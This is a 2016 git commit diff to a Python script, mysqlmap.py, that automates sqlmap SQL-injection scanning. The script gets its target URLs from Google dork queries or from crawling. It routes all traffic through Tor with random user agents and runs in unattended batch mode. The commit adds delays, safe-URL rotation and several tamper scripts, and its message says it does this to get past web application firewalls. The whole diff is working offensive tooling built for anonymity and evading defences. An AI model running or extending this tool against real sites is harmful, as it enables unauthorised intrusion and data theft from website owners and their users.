18d18bb9ed18217cbe77847fd8da035e23ad8e25
xinghuacai <1731977663@qq.com>
2016-01-28 19:22:27 +0800

    update mysqlmap to make it more helpful to supass waf

--- mysqlmap.py
+++ mysqlmap.py
@@ -17,7 +17,7 @@ def sqlmap_g_nohuman(http_url_or_file):
 	#this mode,there is no need for us human to handle any situation.
 	if re.match("(http://)|(https://)",http_url_or_file):
 		domain_url=http_url_or_file[7:] if re.match("(http://)",http_url_or_file) else http_url_or_file[8:]
-		sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp" --smart --batch -v 3 --threads 4 --random-agent''' % domain_url
+		sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp" --delay 2 --smart --batch -v 3 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode''' % (domain_url,http_url_or_file)
 		print("sqlmap_string is:%s" % sqlmap_string)
 		#sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g site:%s allinurl:"php"|"php page="|"php id="|"php tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php CategoryID="|"php action="|"php newsID="|"php newsid="|"php product_id="|"php cat="|"php parent_id="|"php view="|"php itemid="'''
 		os.system("/usr/bin/python2.7 %s" % sqlmap_string)
@@ -28,7 +28,7 @@ def sqlmap_g_nohuman(http_url_or_file):
 		fp.close()
 		for each in all_urls:			
 			domain_url=each[7:] if re.match("(http://)",each) else each[8:]
-			sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp" --smart --batch -v 3 --threads 4 --random-agent''' % domain_url
+			sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g "site:%s inurl:php|asp" --delay 2 --smart --batch -v 3 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode''' % (domain_url,each)
 			print("sqlmap_string is:%s" % sqlmap_string)
 			#sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -g site:%s allinurl:"php"|"php page="|"php id="|"php tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php CategoryID="|"php action="|"php newsID="|"php newsid="|"php product_id="|"php cat="|"php parent_id="|"php view="|"php itemid="'''
 			os.system("/usr/bin/python2.7 %s" % sqlmap_string)
@@ -37,7 +37,7 @@ def sqlmap_craw(origin_http_url_or_file):
 	#this function use sqlmap's "--crawl" option to find sqli urls.
 	if re.match("(http://)|(https://)",origin_http_url_or_file):
 		origin_http_url=re.sub(r'(\s)',"",origin_http_url_or_file)
-		sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --smart -v 3 --threads 4 --batch --random-agent''' % origin_http_url
+		sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --delay 2 --smart -v 3 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode''' % (origin_http_url,origin_http_url)
 		print("sqlmap_string is:%s" % sqlmap_string)
 	else:
 		fp=open(origin_http_url_or_file,"r+")
@@ -45,7 +45,7 @@ def sqlmap_craw(origin_http_url_or_file):
 		fp.close()
 		for each in all_urls:	
 			origin_http_url=re.sub(r'(\s)',"",each)		
-			sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --smart -v 3 --threads 4 --batch --random-agent''' % origin_http_url
+			sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --delay 2 --smart -v 3 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode''' % (origin_http_url,origin_http_url)
 			print("sqlmap_string is %s" % sqlmap_string)
 			os.system("/usr/bin/python2.7 %s" % sqlmap_string)
 
@@ -62,7 +62,7 @@ def sqlmap_g_human(http_url_or_file):
 		#search_url_list=blew expression
 		#easy_search.myGoogleScraper_get_urls_from_query(query,"GoogleScraper_origin_http_domain_url_list")
 		os.system('''/root/myenv/bin/python3.5 easy_search.py "%s"''' % query)#here myenv/python3.5 is the selenium changed version
-		sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 3 --smart --batch --threads 4 --random-agent'''
+		sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 3 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode'''
 		print("sqlmap_string is:%s" % sqlmap_string)
 		os.system("/usr/bin/python2.7 %s" % sqlmap_string)
 	else:
@@ -85,7 +85,7 @@ def sqlmap_g_human(http_url_or_file):
 			#search_url_list=blew expression
 			#easy_search.myGoogleScraper_get_urls_from_query(query,"GoogleScraper_origin_http_domain_url_list")
 			os.system('''/root/myenv/bin/python3.5 easy_search.py "%s"''' % query)#here myenv/python3.5 is the selenium changed version
-		sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 3 --smart --batch --threads 4 --random-agent'''
+		sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_http_domain_url_list.txt -v 3 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode'''
 		print("sqlmap_string is:%s" % sqlmap_string)
 		os.system("/usr/bin/python2.7 %s" % sqlmap_string)
 
